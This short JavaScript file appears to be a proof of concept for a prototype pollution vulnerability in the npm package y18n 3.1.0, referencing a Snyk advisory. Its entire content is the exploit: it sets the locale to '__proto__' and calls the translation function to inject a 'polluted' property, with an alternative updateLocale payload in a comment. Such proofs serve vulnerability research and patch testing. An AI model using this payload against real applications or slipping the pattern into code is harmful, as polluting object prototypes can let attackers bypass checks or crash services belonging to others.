//https://snyk.io/test/npm/y18n/3.1.0
  const y18n = require("y18n")();
  
  y18n.setLocale("__proto__");
  y18n.__("polluted") //updateLocale({ polluted: "yes" }); //payload
